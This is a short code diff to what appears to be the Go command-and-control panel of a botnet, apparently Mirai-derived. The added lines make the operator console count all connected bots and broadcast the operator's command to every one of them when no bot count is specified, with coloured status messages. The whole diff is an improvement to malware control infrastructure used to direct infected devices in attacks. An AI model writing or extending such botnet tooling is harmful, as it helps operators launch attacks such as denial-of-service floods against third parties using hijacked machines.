@@ -1292,6 +1292,14 @@ func (this *Admin) Handle() {
                 continue
             }
             cmd = countSplit[1]
+        } else {
+            // Auto-detect bot count if not specified
+            botCount = clientList.Count()
+            if botCount == 0 {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mNo bots connected\033[0m\r\n")))
+                continue
+            }
+            this.conn.Write([]byte(fmt.Sprintf("\033[32;1mAuto-detected %d bots, sending command to all\033[0m\r\n", botCount)))
         }
         if userInfo.admin == 1 && cmd[0] == '@' {
             cataSplit := strings.SplitN(cmd, " ", 2)
